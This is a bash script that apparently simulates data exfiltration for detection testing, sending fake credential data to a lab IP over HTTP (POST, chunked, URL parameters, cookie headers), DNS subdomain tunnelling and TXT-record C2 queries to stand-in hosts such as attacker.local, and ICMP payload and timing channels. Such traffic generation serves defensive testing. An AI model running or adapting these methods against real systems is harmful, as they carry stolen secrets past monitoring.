#!/bin/bash
###############################################################################
# Data Exfiltration Script
# HTTP, DNS, ICMP exfiltration simulation
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.40.10}"
TARGET_PORT="${3:-80}"
RESULTS_DIR="${4:-.}"

mkdir -p "$RESULTS_DIR"

echo "[*] Exfiltration simulation: $SUBTYPE against ${TARGET_IP}"

# Generate fake sensitive data for exfiltration
generate_fake_data() {
    local size="${1:-1024}"
    python3 -c "
import random, string, json
data = {
    'type': 'exfiltrated_data',
    'hostname': 'target-server',
    'users': ['admin', 'root', 'operator'],
    'passwords': [''.join(random.choices(string.ascii_letters + string.digits, k=12)) for _ in range(5)],
    'internal_ips': ['10.10.{}.{}'.format(random.randint(10,50), random.randint(1,254)) for _ in range(10)],
    'payload': ''.join(random.choices(string.ascii_letters, k=$size))
}
print(json.dumps(data))
"
}

run_http_exfil() {
    echo "[*] HTTP exfiltration simulation"

    # Method 1: POST data to target (simulating stolen data upload)
    echo "[*] POST-based exfiltration..."
    for i in $(seq 1 10); do
        local data
        data=$(generate_fake_data 512)
        curl -sk -X POST "http://${TARGET_IP}:${TARGET_PORT}/" \
            -H "Content-Type: application/json" \
            -H "X-Session-ID: exfil-$(openssl rand -hex 4)" \
            -d "$data" \
            -o /dev/null 2>&1 || true
        sleep $((RANDOM % 5 + 2))
    done

    # Method 2: Chunked transfer encoding
    echo "[*] Chunked transfer exfiltration..."
    for i in $(seq 1 5); do
        local chunk_data
        chunk_data=$(openssl rand -hex 256)
        curl -sk -X POST "http://${TARGET_IP}:${TARGET_PORT}/" \
            -H "Transfer-Encoding: chunked" \
            -H "X-Chunk-ID: ${i}" \
            -d "$chunk_data" \
            -o /dev/null 2>&1 || true
        sleep $((RANDOM % 8 + 3))
    done

    # Method 3: Encoded in URL parameters
    echo "[*] URL parameter exfiltration..."
    for i in $(seq 1 10); do
        local encoded_data
        encoded_data=$(openssl rand -hex 32)
        curl -sk "http://${TARGET_IP}:${TARGET_PORT}/?d=${encoded_data}&s=${i}&t=$(date +%s)" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
            -o /dev/null 2>&1 || true
        sleep $((RANDOM % 3 + 1))
    done

    # Method 4: Steganographic headers
    echo "[*] Header-based exfiltration..."
    for i in $(seq 1 10); do
        local header_data
        header_data=$(openssl rand -base64 48 | tr -d '\n')
        curl -sk "http://${TARGET_IP}:${TARGET_PORT}/" \
            -H "Cookie: session=${header_data}" \
            -H "X-Forwarded-For: $(openssl rand -hex 4)" \
            -H "Referer: http://internal.corp/data/${i}" \
            -o /dev/null 2>&1 || true
        sleep $((RANDOM % 4 + 1))
    done

    echo "[+] HTTP exfiltration complete"
}

run_dns_exfil() {
    echo "[*] DNS exfiltration simulation"

    # Encode data as DNS subdomain queries
    local secret="password123:admin:10.10.20.1:ssh_key_contents"
    local encoded
    encoded=$(echo "$secret" | base64 | tr '+/' '-_' | tr -d '=' | tr -d '\n')

    echo "[*] Subdomain-encoded exfiltration..."
    local chunk_size=20
    local seq=0
    local i=0
    while [[ $i -lt ${#encoded} ]]; do
        chunk="${encoded:$i:$chunk_size}"
        dig "${seq}-${chunk}.data.attacker.local" A +short 2>/dev/null || true
        nslookup "${seq}-${chunk}.exfil.c2.net" "$TARGET_IP" 2>/dev/null || true
        seq=$((seq + 1))
        i=$((i + chunk_size))
        sleep $((RANDOM % 3 + 1))
    done

    # TXT record queries for C2 commands
    echo "[*] TXT record C2 simulation..."
    for i in $(seq 1 15); do
        dig "cmd${i}.control.attacker.local" TXT +short 2>/dev/null || true
        sleep $((RANDOM % 5 + 2))
    done

    # High-frequency DNS burst (detectable pattern)
    echo "[*] DNS burst exfiltration..."
    for i in $(seq 1 30); do
        dig "burst-${i}-$(openssl rand -hex 4).fast.attacker.local" A +short 2>/dev/null &
        if (( i % 5 == 0 )); then
            wait
            sleep 1
        fi
    done
    wait

    echo "[+] DNS exfiltration complete"
}

run_icmp_exfil() {
    echo "[*] ICMP tunnel exfiltration simulation"

    # Ping with custom payload sizes (data in ICMP payload)
    echo "[*] ICMP payload exfiltration..."

    # Variable-size pings (encoding data in packet size)
    local sizes=(64 128 256 512 1024 100 200 300 400 500)
    for size in "${sizes[@]}"; do
        ping -c 2 -s "$size" -W 2 "$TARGET_IP" > /dev/null 2>&1 || true
        sleep 1
    done

    # Rapid small pings (timing-based encoding)
    echo "[*] Timing-based ICMP encoding..."
    for i in $(seq 1 20); do
        ping -c 1 -s 56 -W 1 "$TARGET_IP" > /dev/null 2>&1 || true
        # Variable delay encodes data
        sleep "0.$((RANDOM % 9 + 1))"
    done

    # Large ICMP packets (suspicious)
    echo "[*] Large ICMP packets..."
    for i in $(seq 1 5); do
        ping -c 3 -s 1400 -W 2 "$TARGET_IP" > /dev/null 2>&1 || true
        sleep 2
    done

    echo "[+] ICMP exfiltration complete"
}

case "$SUBTYPE" in
    http)   run_http_exfil ;;
    dns)    run_dns_exfil ;;
    icmp)   run_icmp_exfil ;;
    full)
        run_http_exfil
        sleep 5
        run_dns_exfil
        sleep 5
        run_icmp_exfil
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: http, dns, icmp, full"
        exit 1
        ;;
esac

echo "[*] Exfiltration script complete"
